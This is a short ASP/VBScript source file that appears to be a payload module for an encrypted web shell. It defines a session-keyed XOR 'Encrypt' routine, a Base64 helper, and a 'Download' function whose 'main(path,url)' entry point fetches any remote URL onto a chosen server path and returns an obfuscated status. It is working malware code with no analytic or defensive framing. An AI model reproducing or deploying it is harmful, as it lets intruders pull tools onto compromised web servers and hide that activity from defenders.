Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function

Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Download(filePath,url)
On Error Resume Next
dim xmlhttp
set xmlhttp = server.CreateObject("Microsoft.XMLHTTP")
xmlhttp.open "get",url,false
xmlhttp.send
dim html
html = xmlhttp.ResponseBody
dim fileName,fileNameSplit
fileNameSplit = Split(url,"/")
fileName = fileNameSplit(Ubound(fileNameSplit))

Set saveFile = Server.CreateObject("Adodb.Stream")
saveFile.Type = 1
saveFile.Open
saveFile.Write html
saveFile.SaveToFile filePath&"/"&fileName, 2
set saveFile=nothing
If Err Then 
	Download=Err.Description
Else
	Download="Success" 
End If
Response.binarywrite(Encrypt(Base64Encode(Download)))
End Function

Function Getname()
on error resume next
    Dim y,m,d,h,mm,S, r
    Randomize
    y = Year(Now)
    m = Month(Now): If m < 10 Then m = "0" & m
    d = Day(Now): If d < 10 Then d = "0" & d
    h = Hour(Now): If h < 10 Then h = "0" & h
    mm = Minute(Now): If mm < 10 Then mm = "0" & mm
    S = Second(Now): If S < 10 Then S = "0" & S
    r = 0
    r = CInt(Rnd() * 1000)
    If r < 10 Then r = "00" & r
    If r < 100 And r >= 10 Then r = "0" & r
    Getname = y & m & d & h & mm & S & r
End Function
Function main(path,url)
	call Download(path,url)
end Function
